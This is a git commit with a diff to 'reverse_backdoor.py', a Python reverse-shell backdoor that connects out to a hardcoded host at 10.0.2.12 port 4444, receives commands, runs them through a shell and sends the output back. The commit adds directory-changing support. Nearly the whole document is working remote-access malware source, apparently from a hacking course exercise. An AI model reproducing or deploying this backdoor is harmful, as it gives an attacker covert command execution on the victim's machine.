40fb1ac0d024ce8df51c14020f271da3a093c47a
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-11-17 13:50:43 -0500

    Fixing the ability to execute system commands correctly

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,12 +1,11 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json
+import socket, subprocess, json, os
 
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -24,13 +23,20 @@ class Backdoor:
     def execute_system_command(self,command):
         return subprocess.check_output(command, shell=True)
 
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
     def run(self):
         while True:
             command = self.reliable_receive()
             if command[0] == "exit":
                 self.connection.close()
                 exit()
-            command_result = self.execute_system_command(command)
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.change_working_directory_to(command[1])
+            else:
+                command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
 
 my_backdoor = Backdoor("10.0.2.12", 4444)
